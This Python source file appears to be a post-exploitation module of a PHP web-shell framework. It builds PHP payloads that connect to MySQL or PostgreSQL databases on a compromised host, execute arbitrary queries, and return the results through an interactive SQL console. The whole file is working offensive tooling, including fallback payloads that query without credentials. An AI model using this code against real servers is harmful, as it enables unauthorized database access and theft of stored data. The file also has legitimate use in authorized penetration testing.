from core.vectors import PhpCode, ShellCmd, ModuleExec, Os
from core.module import Module
from core.loggers import log
from core import modules
from core import messages
import utils

class Console(Module):

    """Execute SQL query or run console."""

    def init(self):

        self.register_info(
            {
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )


        self.register_vectors(
            [
            PhpCode(
              """if(mysql_connect("${host}","${user}","${passwd}")){$r=mysql_query("${query}");if($r){while($c=mysql_fetch_row($r)){foreach($c as $key=>$value){echo $value."${linsep}";}echo "${colsep}";}};mysql_close();}""",
              name = 'mysql',
            ),
            PhpCode("""$r=mysql_query("${query}");if($r){while($c=mysql_fetch_row($r)){foreach($c as $key=>$value){echo $value."${linsep}";}echo "${colsep}";}};mysql_close();""",
              name = "mysql_fallback"
            ),
            PhpCode( """if(pg_connect("host=${host} user=${user} password=${passwd}")){$r=pg_query("${query}");if($r){while($c=pg_fetch_row($r)){foreach($c as $key=>$value){echo $value."${linsep}";}echo "${colsep}";}};pg_close();}""",
              name = "pgsql"
            ),
            PhpCode( """$r=pg_query("${query}");if($r){while($c=pg_fetch_row($r)){foreach($c as $key=>$value){echo $value."${linsep}";} echo "${colsep}";}};pg_close();""",
              name = "pgsql_fallback"
            ),
            ]
        )

        self.register_arguments([
          { 'name' : '-user', 'help' : 'SQL username' },
          { 'name' : '-passwd', 'help' : 'SQL password' },
          { 'name' : '-host', 'help' : 'Db host or host:port', 'nargs' : '?', 'default' : '127.0.0.1' },
          { 'name' : '-dbms', 'help' : 'Db type', 'choices' : ('mysql', 'pgsql'), 'default' : 'mysql' },
          { 'name' : '-query', 'help' : 'Execute a single query' },
        ])

    def _query(self, vector, args):


        # Random generate a separator for columns and lines
        colsep = '----%s' % utils.strings.randstr(6)
        linsep = '----%s' % utils.strings.randstr(6)
        args.update(
            { 'colsep' : colsep, 'linsep' : linsep, }
        )

        result = self.vectors.get_result(vector, args)

        if result:
            return [
              line.split(linsep) for line
              in result.strip(linsep).replace(linsep + colsep, colsep).split(colsep) if line
            ]

        # If the result is none, prints error message about missing trailer
        command_last_chars = utils.prettify.shorten(self.args['query'].rstrip(),
                                                        keep_trailer = 10)

        if (command_last_chars and command_last_chars[-1] != ';'):
            log.warn(messages.module_sql_console.missing_sql_trailer_s % command_last_chars)


    def run(self):

        # The vector name is given by the db type
        vector = self.args.get('dbms')

        # And by the user and password presence
        vector += (
                    '' if self.args.get('user') and self.args.get('passwd')
                    else '_fallback'
                )

        # If the query is set, just execute it
        if self.args.get('query'):
            return self._query(vector, self.args)

        # Else, start the console.
        # Check credentials
        self.args['query'] = (
                    'SELECT USER;' if vector.startswith('pgsql')
                    else 'SELECT USER();'
                )

        user = self._query(vector, self.args)
        if not user:
            log.warn(messages.module_sql_console.check_credentials)
            return

        if user[0]:
            user = user[0][0]

        # Console loop
        while True:

            query = raw_input('%s SQL> ' % user).strip()

            if not query: continue
            if query == 'quit': break

            self.args['query'] = query
            result = self._query(vector, self.args)
            self.print_result(result)

    def print_result(self, result):

        if result == None:
            log.warn('%s %s' % (messages.module_sql_console.no_data,
                                messages.module_sql_console.check_credentials)
                    )
        elif not result:
            log.warn(messages.module_sql_console.no_data)
        else:
            Module.print_result(self, result)
